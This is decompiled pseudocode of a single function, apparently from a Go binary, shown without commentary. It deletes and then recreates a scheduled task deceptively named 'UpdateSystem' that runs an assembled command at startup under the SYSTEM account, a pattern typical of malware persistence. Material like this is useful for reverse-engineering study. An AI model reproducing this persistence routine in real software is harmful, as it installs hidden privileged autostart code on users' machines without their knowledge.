__int64 __fastcall sub_4FD120()
{
  __int64 v0; // rbx
  __int64 v1; // r14
  __int64 v2; // rax
  __int64 v3; // rbx
  __int64 *v5; // [rsp+0h] [rbp-158h]
  _QWORD v6[6]; // [rsp+10h] [rbp-148h] BYREF
  __int64 v7; // [rsp+40h] [rbp-118h]
  __int64 v8; // [rsp+48h] [rbp-110h]
  __int64 v9; // [rsp+50h] [rbp-108h]
  __int64 v10; // [rsp+58h] [rbp-100h]
  __int64 v11; // [rsp+60h] [rbp-F8h]
  void *v12; // [rsp+68h] [rbp-F0h]
  __int64 v13; // [rsp+70h] [rbp-E8h]
  void *v14; // [rsp+78h] [rbp-E0h]
  __int64 v15; // [rsp+80h] [rbp-D8h]
  const char *v16; // [rsp+88h] [rbp-D0h] BYREF
  _QWORD v17[17]; // [rsp+90h] [rbp-C8h] BYREF
  _QWORD v18[8]; // [rsp+118h] [rbp-40h] BYREF
  __int64 vars0; // [rsp+158h] [rbp+0h] BYREF

  if ( (unsigned __int64)v17 <= *(_QWORD *)(v1 + 16) )
    sub_470660();
  v2 = sub_4B4D40();
  if ( qword_6C7F78 == 0 )
    sub_472A00();
  v8 = v0;
  v11 = v2;
  v3 = qword_6C7F78 - 1;
  v9 = sub_4C83E0(a1: " ", a2: 1, a3: qword_6C7F70, a4: qword_6C7F80 - 1);
  v6[5] = v3;
  v12 = &unk_50FEE0;
  v13 = runtime_convTstring();
  v14 = &unk_50FEE0;
  v15 = runtime_convTstring();
  v10 = fmt_Sprintf();
  v7 = 7;
  v18[1] = 7;
  v18[0] = "/Delete";
  v18[3] = 3;
  v18[2] = "/TN";
  v18[5] = 12;
  v18[4] = "UpdateSystem";
  v18[7] = 2;
  v18[6] = "/F";
  sub_4CDE40(a1: 4, a2: 4, a3: "/F", a4: v18);
  sub_4CF220();
  v5 = &vars0;
  sub_472BF9(a1: &v6[9]);
  v17[0] = 7;
  v16 = "/Create";
  v17[2] = 3;
  v17[1] = "/SC";
  v17[4] = 7;
  v17[3] = "ONSTART";
  v17[6] = 3;
  v17[5] = "/TN";
  v17[8] = 12;
  v17[7] = "UpdateSystem";
  v17[10] = 3;
  v17[9] = "/TR";
  v17[12] = v7;
  v17[11] = v10;
  v17[14] = 3;
  v17[13] = "/RU";
  v17[16] = 6;
  v17[15] = "SYSTEM";
  sub_4CDE40(a1: 9, a2: 9, a3: "SYSTEM", a4: &v16);
  return sub_4CF220();
}